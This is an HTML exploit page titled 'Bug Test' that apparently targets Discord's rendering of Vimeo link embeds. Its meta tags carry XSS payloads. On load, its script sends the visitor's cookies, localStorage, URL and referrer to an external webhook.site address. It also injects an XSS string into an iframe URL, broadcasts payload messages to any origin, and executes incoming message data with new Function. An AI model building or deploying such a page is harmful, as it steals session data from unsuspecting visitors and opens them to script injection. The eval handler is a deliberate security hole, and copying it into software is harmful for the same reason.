<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <meta property="og:site_name" content="Vimeo">
    <meta property="og:url" content="https://vimeo.com/403530213">
    <meta property="og:type" content="video.other">
    <meta property="og:title" content="javascript:alert(1)">
    <meta property="og:description" content="&lt;img src=x onerror=alert(1)&gt;">
    <meta property="og:image" content="https://i.vimeocdn.com/video/873029368-78a366b9407757e066a37718d766be53d3cb90d7f27708590ca16a1400e95b89-d">
    <meta property="og:video" content="https://player.vimeo.com/video/403530213">
    <meta property="og:video:url" content="https://player.vimeo.com/video/403530213">
    <meta property="og:video:secure_url" content="https://player.vimeo.com/video/403530213">
    <meta property="og:video:type" content="text/html">
    <meta property="og:video:width" content="640">
    <meta property="og:video:height" content="360">
    <title>Bug Test</title>
    <script src="https://player.vimeo.com/api/player.js"></script>
    <script>
        function logToWebhook(data) {
            const img = new Image();
            img.src = `https://webhook.site/bbeb07ea-30e9-4522-802f-7e6ad1ccb124?data=${encodeURIComponent(JSON.stringify(data))}`;
        }

        async function attemptExploit() {
            try {
                // Log initial state
                logToWebhook({
                    type: 'page_load',
                    url: window.location.href,
                    referrer: document.referrer,
                    cookies: document.cookie,
                    localStorage: JSON.stringify(localStorage),
                    timestamp: new Date().toISOString()
                });

                // Create frame with potentially malicious attributes
                const frame = document.createElement('iframe');
                frame.src = 'https://player.vimeo.com/video/403530213?xss=\"><img src=x onerror=alert(1)>';
                frame.width = '640';
                frame.height = '360';
                frame.allow = 'autoplay; fullscreen';
                frame.sandbox = 'allow-scripts allow-same-origin';
                frame.onload = () => {
                    // Try to escape sandbox
                    try {
                        frame.contentWindow.postMessage({
                            type: 'DISCORD_EXPLOIT',
                            payload: '<img src=x onerror=alert(document.domain)>'
                        }, '*');
                    } catch(e) {
                        logToWebhook({
                            type: 'sandbox_escape_attempt',
                            error: e.toString()
                        });
                    }

                    logToWebhook({
                        type: 'frame_loaded',
                        timestamp: new Date().toISOString()
                    });

                    window.parent.postMessage({
                        type: 'DISCORD_EMBED_LOADED',
                        data: {
                            url: 'https://vimeo.com/403530213',
                            width: '640',
                            height: '360'
                        }
                    }, '*');
                };
                document.getElementById('vimeo-player').appendChild(frame);

            } catch(e) {
                logToWebhook({
                    type: 'error',
                    error: e.toString(),
                    stack: e.stack,
                    timestamp: new Date().toISOString()
                });
                console.error('Error:', e);
            }
        }

        window.onmessage = (e) => {
            logToWebhook({
                type: 'message_received',
                origin: e.origin,
                data: e.data,
                timestamp: new Date().toISOString()
            });

            // Test message handler vulnerability
            if (typeof e.data === 'string' && e.data.includes('script')) {
                // Potentially dangerous eval
                try {
                    new Function(e.data)();
                } catch(e) {
                    logToWebhook({
                        type: 'eval_attempt',
                        error: e.toString()
                    });
                }
            }

            if (e.origin.includes('discord.com')) {
                e.source.postMessage({
                    type: 'DISCORD_EMBED_UPDATE',
                    data: {
                        html: '',
                        url: 'https://vimeo.com/403530213'
                    }
                }, '*');
            }
        };

        window.onload = attemptExploit;
    </script>
</head>
<body>
    <div id="vimeo-player"></div>
</body>
</html>
